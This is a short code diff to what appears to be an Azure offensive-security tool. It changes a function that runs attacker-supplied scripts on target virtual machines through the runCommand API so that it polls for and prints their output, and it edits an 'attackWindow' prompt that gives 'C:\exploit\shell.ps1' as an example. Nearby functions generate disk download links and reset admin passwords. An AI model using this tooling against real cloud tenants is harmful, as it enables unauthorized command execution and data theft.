@@ -816,6 +816,7 @@ def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
         return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync['json']['accessSAS']
     else:
         return "Failed to generate SAS link for Disk."
+
 def CON_GetPublishProfileBySite(SiteId):
     global Token
     output = []
@@ -884,11 +885,18 @@ def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command)
         "script": [Command]
     }
     rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",req, Token)
-    if rs['status_code'] == 202 or rs['status_code'] == 200:
-        return "Successfully Created Shell Script."
+    if rs['status_code'] == 202:
+        rsAsync = sendGETRequest(str(rs['headers']['Location']),Token)
+        print("Running command...")
+        while(True):
+            x = sendGETRequest(str(rsAsync['headers']['Location']),Token)
+            if x["status_code"] != 200:
+                continue
+            else:
+                print(x["json"]["message"])
+                break
     else:
         return "Failed to Create Shell Script."
-
 
 
 def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, adminAccount):
@@ -2282,7 +2290,7 @@ def attackWindow():
                     print(make_table(field_names, rows))
                     TargetVM = input("Select Target VM Name [i.e. 0]: ")
                     Selection = int(TargetVM)
-                    CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
+                    CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1|.sh]: ")
                     try:
                         with open(os.path.normpath(CmdVMPath)) as f:
                             CmdFileContent = f.read()
